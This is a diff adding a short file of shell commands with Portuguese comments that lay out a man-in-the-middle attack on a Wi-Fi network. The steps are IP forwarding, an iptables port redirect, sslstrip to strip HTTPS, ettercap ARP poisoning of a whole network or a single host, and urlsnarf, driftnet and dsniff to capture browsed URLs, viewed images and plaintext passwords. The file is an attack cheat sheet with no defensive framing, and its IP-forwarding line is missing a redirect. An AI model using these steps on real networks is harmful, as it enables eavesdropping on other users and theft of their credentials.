@@ -1,0 +1,27 @@
+// route para saber o gateway
+route
+
+// para passar a compartilhar ip
+echo 1 /proc/sys/net/ipv4/ip_forward
+
+// Redirecionar para porta 80 e escutar na 1000
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+// Escutar porta 10000
+sslstrip -l 10000
+
+// Efetuar ataca em toda rede wifi
+ettercap -T -q -i wlan0 -M arp:remote /// ///
+
+// Efetuar em apenas um pc
+ettercap -T -q -i wlan0 -M arp:remote /192.168.1.1/ /192.168.1.105/
+
+// Capturar enderecoes do brownser 
+urlsnarf -i wlan0
+
+// Ver imagens sendo abertas
+driftnet -i wlan0
+
+// Passwords sem https
+dsniff -i wlan0
+
